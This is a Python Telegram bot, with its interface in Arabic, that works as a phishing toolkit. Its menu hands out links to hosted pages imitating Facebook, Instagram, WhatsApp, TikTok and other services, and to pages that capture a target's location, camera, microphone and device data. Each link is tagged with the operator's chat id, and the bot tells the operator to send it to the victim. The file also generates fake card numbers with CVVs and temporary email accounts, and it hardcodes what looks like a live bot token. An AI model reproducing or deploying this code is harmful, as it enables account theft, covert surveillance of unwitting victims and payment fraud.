import os, time, threading, random, string, requests, logging
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
CALL_SITE = "https://callmyphone.org/app"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

user_states = {}
bot_rating = 0

JOKES = ["نكتة 1", "نكتة 2", "نكتة 3"]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    prefixes = ["4", "5", "37", "34"]
    prefix = random.choice(prefixes)
    length = 16 if prefix in ["4", "5"] else 15
    while len(prefix) < length: prefix += str(random.randint(0,9))
    number = prefix; exp_month = str(random.randint(1,12)).zfill(2)
    exp_year = str(random.randint(2025,2030)); cvv = str(random.randint(100,999))
    return f"💳 رقم: {number}\n📅 تاريخ: {exp_month}/{exp_year}\n🔒 CVV: {cvv}"

def create_temp_email():
    try:
        s = requests.Session()
        r = s.get('https://api.mail.tm/domains', headers={'User-Agent':'Mozilla/5.0'})
        domain = r.json()['hydra:member'][0]['domain']
        email = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + "@" + domain
        pwd = generate_password(12)
        s.post('https://api.mail.tm/accounts', json={'address':email,'password':pwd}, headers={'User-Agent':'Mozilla/5.0'})
        return f"📧 البريد: {email}\n🔑 كلمة المرور: {pwd}"
    except: return "فشل إنشاء بريد مؤقت، حاول لاحقاً"

def shorten_url(url):
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url

# ========== لوحة الأزرار الرئيسية ==========
def main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    tools = [
        ("📘 فيسبوك","facebook.html"), ("🎵 تيك توك","tiktok.html"),
        ("👻 سناب شات","snapchat.html"), ("📷 انستقرام","instagram.html"),
        ("💬 واتساب","whatsapp.html"), ("✈️ تيليجرام","telegram.html"),
        ("🐦 تويتر","twitter.html"), ("▶️ يوتيوب","youtube.html"),
        ("🎮 ديسكورد","discord.html"), ("🤖 ريدت","reddit.html"),
        ("📍 الموقع","gps.html"), ("📸 الكاميرا","camera.html"),
        ("🎙️ ميكروفون","mic.html"), ("🎥 فيديو","video.html"),
        ("📱 الجهاز","device.html"),
    ]
    for i in range(0, len(tools), 2):
        left = tools[i]; right = tools[i+1] if i+1 < len(tools) else None
        markup.row(types.InlineKeyboardButton(left[0], callback_data=f"phish|{left[1]}"),
                   types.InlineKeyboardButton(right[0], callback_data=f"phish|{right[1]}") if right else None)
    markup.row(types.InlineKeyboardButton("🎮 ببجي UC", callback_data="phish|pubg_cuc.html"),
               types.InlineKeyboardButton("🏆 مسابقة الحلم", callback_data="phish|dream.html"))
    reports = [
        ("🐦 بلاغ تويتر","https://help.twitter.com/forms"),
        ("👻 بلاغ سناب","https://support.snapchat.com/community-report"),
        ("▶️ بلاغ يوتيوب","https://www.youtube.com/reportingtool"),
        ("✈️ بلاغ تيليجرام","https://telegram.org/faq_report"),
        ("🎵 بلاغ تيك توك","https://www.tiktok.com/legal/report/feedback"),
        ("📷 بلاغ انستقرام","https://help.instagram.com/contact/383679321740945"),
    ]
    for name, link in reports:
        markup.row(types.InlineKeyboardButton(name, url=link))
    markup.row(types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call"),
               types.InlineKeyboardButton("🔍 معرف الإيدي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("💬 فك حظر واتساب", callback_data="unban"),
               types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"))
    markup.row(types.InlineKeyboardButton("🌐 ترجمة نص", callback_data="translate"),
               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
    markup.row(types.InlineKeyboardButton("🖼️ إنشاء باركود", callback_data="createqr"),
               types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"))
    markup.row(types.InlineKeyboardButton("✉️ بريد وهمي", callback_data="tempmail"),
               types.InlineKeyboardButton("😂 نكتة", callback_data="joke"))
    markup.row(types.InlineKeyboardButton("📜 شروط", callback_data="terms"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))
    return markup

# ========== بوت تيليجرام (يستخدم الاستقصاء) ==========
@bot.message_handler(commands=['start'])
def start(msg):
    bot.send_message(msg.chat.id, "🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:", reply_markup=main_menu(msg.chat.id), parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id; data = call.data; msg_id = call.message.message_id
    if data == "back":
        bot.edit_message_text("🔱 <b>بوت الجنرال V2</b>\n\nاختر الأداة:", chat_id, msg_id, reply_markup=main_menu(chat_id), parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return
    if data.startswith("phish|"):
        file = data.split("|")[1]
        link = f"{BASE_URL}/{file}?chat={chat_id}"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية.", chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    if data == "call":
        user_states[chat_id] = "call"
        bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00):")
        bot.answer_callback_query(call.id)
        return
    if data == "myid":
        bot.send_message(chat_id, f"معرفك: {call.from_user.id}")
        bot.answer_callback_query(call.id)
        return
    if data == "unban":
        text = ("🔓 <b>فك حظر واتساب</b>\n\nأرسل هذه الرسالة للإيميلات:\n<code>عزيزي الدعم،\nرقمي +967XXXXXXXX</code>")
        bot.send_message(chat_id, text, parse_mode="HTML")
        bot.answer_callback_query(call.id)
        return
    if data == "shorten":
        user_states[chat_id] = "shorten"
        bot.send_message(chat_id, "أرسل الرابط لاختصاره:")
        bot.answer_callback_query(call.id)
        return
    if data == "translate":
        user_states[chat_id] = "translate"
        bot.send_message(chat_id, "أرسل النص لترجمته:")
        bot.answer_callback_query(call.id)
        return
    if data == "readqr":
        user_states[chat_id] = "readqr"
        bot.send_message(chat_id, "أرسل صورة الباركود:")
        bot.answer_callback_query(call.id)
        return
    if data == "createqr":
        user_states[chat_id] = "createqr"
        bot.send_message(chat_id, "أرسل النص لإنشاء باركود:")
        bot.answer_callback_query(call.id)
        return
    if data == "visa":
        bot.send_message(chat_id, generate_fake_visa())
        bot.answer_callback_query(call.id)
        return
    if data == "tempmail":
        bot.send_message(chat_id, create_temp_email())
        bot.answer_callback_query(call.id)
        return
    if data == "joke":
        bot.send_message(chat_id, random.choice(JOKES))
        bot.answer_callback_query(call.id)
        return
    if data == "rate":
        global bot_rating
        bot_rating += 1
        bot.send_message(chat_id, f"⭐ التقييمات: {bot_rating}")
        bot.answer_callback_query(call.id)
        return
    if data == "terms":
        bot.send_message(chat_id, "📜 <b>شروط الاستخدام</b>\n✅ للاستخدام المشروع فقط.")
        bot.answer_callback_query(call.id)
        return
    if data == "hack":
        bot.send_message(chat_id, "💻 <b>كيف تصبح هاكر</b>\n1. Linux 2. Python 3. شبكات")
        bot.answer_callback_query(call.id)
        return
    bot.answer_callback_query(call.id, text="غير معروف")

# معالجات الرسائل التفاعلية
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "call")
def handle_call(m):
    number = m.text.strip().replace("+","").replace(" ","")
    if number: bot.send_message(m.chat.id, f"رابط الاتصال: {CALL_SITE}?number={number}")
    user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    url = m.text.strip()
    if url.startswith("http"):
        short = shorten_url(url)
        bot.send_message(m.chat.id, f"المختصر: {short}")
    user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "translate")
def handle_translate(m):
    bot.send_message(m.chat.id, f"النص المترجم: {m.text}")
    user_states.pop(m.chat.id, None)

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    if user_states.get(m.chat.id) == "readqr":
        bot.send_message(m.chat.id, "تم قراءة الباركود (محاكاة)")
        user_states.pop(m.chat.id, None)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "createqr")
def handle_createqr(m):
    try:
        import qrcode
        from io import BytesIO
        img = qrcode.make(m.text)
        bio = BytesIO(); img.save(bio, 'PNG'); bio.seek(0)
        bot.send_photo(m.chat.id, bio)
    except: bot.send_message(m.chat.id, "تعذر إنشاء الباركود")
    user_states.pop(m.chat.id, None)

# ========== تشغيل البوت (Polling) ==========
def run_bot():
    while True:
        try:
            print("⏳ بدء الاستقصاء...")
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            print(f"⚠️ خطأ في الاستقصاء: {e}")
            time.sleep(10)

# ========== بدء التطبيق ==========
if __name__ == '__main__':
    # تشغيل Flask في الخلفية (اختياري لتقديم الصفحات)
    def start_flask():
        app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
    
    threading.Thread(target=start_flask, daemon=True).start()
    # تشغيل البوت في الخيط الرئيسي
    run_bot()